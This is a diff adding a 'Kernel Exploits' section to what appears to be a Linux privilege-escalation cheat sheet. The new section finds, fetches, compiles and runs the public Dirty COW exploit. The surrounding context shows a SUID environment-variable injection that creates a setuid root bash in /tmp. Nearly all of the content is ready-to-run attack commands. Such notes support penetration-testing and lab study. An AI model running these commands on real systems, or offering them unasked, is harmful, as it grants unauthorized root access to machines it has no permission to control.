@@ -249,8 +249,19 @@ export -f /usr/sbin/service
 env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
 /tmp/rootbash -p
 ```
-##  Kernel Exploits
+## Kernel Exploits ✅
+### Example "Dirty COW" ✡️
+```bash
+bash linux-exploit-suggester.sh
+perl linux-exploit-suggester-2.pl
 
+searchsploit --cve CVE-2016-5195
+searchsploit -m linux/local/40616.c
+# We transfer the file to the target system
+
+gcc /tmp/40616.c -pthread -o /tmp/exploit
+./exploit
+```
 ## NFS ✅
 ```bash
 cat /etc/exports # target machine
